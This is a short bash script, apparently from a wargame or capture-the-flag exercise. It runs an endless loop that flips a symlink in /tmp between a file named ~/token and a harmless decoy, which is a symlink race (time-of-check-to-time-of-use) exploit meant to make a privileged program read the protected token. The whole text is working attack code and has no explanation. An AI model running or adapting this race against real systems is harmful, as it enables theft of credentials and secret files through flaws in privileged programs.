#!/bin/bash
touch /tmp/fake;
while true; do ln -fs ~/token /tmp/link; ln -fs /tmp/fake /tmp/link; done
